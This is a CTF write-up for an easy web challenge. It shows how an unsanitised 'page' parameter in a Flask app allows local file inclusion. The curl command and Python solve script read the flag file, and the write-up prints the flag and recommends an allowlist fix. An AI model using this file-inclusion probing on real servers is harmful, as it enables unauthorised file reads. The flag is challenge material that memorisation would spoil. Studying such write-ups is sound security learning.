---
title: "Sneaky Includes"
ctf: "Safaricom CTF"
date: 2026-10-06
category: web
difficulty: easy
points: 150
flag_format: "safctf{...}"
author: "Strawhats"
---

# Sneaky Includes

> **Category:** WEB · **Points:** 150 · **Difficulty:** easy

## Discovery, analysis & exploitation

The full hunt below is reproduced from our working notes — recon, fingerprinting, the bug, dead ends, and the path to the flag.

- **Target:** http://54.72.82.22:8030

## Observations

Werkzeug/3.1.9 (Python 3.10) Flask app, "Quiet Grove" theme. The index body
contains a planted hint:

```html
... they had <b>/health.</b>
```

`/health` returns 200 with a 2-byte body. Probing parameters, every unknown
param echoed the full 8429-byte index page — except `page=`, which returned a
short 59-byte body:

```html
<h2>Oops! Something went wrong while loading the page.</h2>
```

So `page` is an include path that failed. The error is swallowed, which makes
this a blind-ish LFI: we only learn success vs. failure from the response.

## Exploit

Walk the include path until the flag file resolves. Relative `flag.txt` and
absolute `/flag.txt` both work:

```sh
curl 'http://54.72.82.22:8030/?page=flag.txt'
```

```
safctf{9fdb535dbf8020d488bf8d6a51287778}
```

Note `../flag.txt` returns the error body while plain `flag.txt` succeeds — the
working directory is already the flag's directory, and traversal is filtered.

## Root cause / fix

User input is concatenated straight into a server-side file include with no
allowlist. Fix: map an explicit dict of allowed page names
(`{"about": "about.html", ...}`) and never pass user input to the filesystem;
if that is unavoidable, resolve the final path and assert it stays inside a
fixed base directory.

## Reproduction

```sh
.venv/bin/python chal/web/sneaky-includes/solve.py
```

## Solve script

`web/sneaky-includes/solve.py`:

```python
#!/usr/bin/env python3
"""Sneaky Includes — safctf

The `page` query parameter is passed straight to a server-side file include.
The flag sits in the app's working directory, so a bare filename resolves it.

    python3 solve.py
"""
import urllib.parse
import urllib.request

TARGET = "http://54.72.82.22:8030"


def fetch(page: str) -> str:
    url = f"{TARGET}/?" + urllib.parse.urlencode({"page": page})
    with urllib.request.urlopen(url, timeout=10) as r:
        return r.read().decode(errors="replace")


def main() -> None:
    for candidate in ("flag.txt", "/flag.txt", "flag", "/flag"):
        body = fetch(candidate)
        if "safctf{" in body:
            print(f"page={candidate!r} -> {body.strip()}")
            return
        print(f"page={candidate!r} -> miss ({len(body)}B)")
    print("no flag found")


if __name__ == "__main__":
    main()
```

## Tools

**Used in this solve:**

- Python `urllib` (stdlib HTTP client)
- Python 3 (solver)
- curl

**Other tools that fit this category:**

- Burp Suite / mitmproxy (intercept + repeat)
- ffuf / feroxbuster (content & parameter discovery)
- sqlmap (automated SQLi)
- tplmap (SSTI)
- jwt_tool (JWT attacks)
- nikto
- nuclei

## Flag

```
safctf{9fdb535dbf8020d488bf8d6a51287778}
```
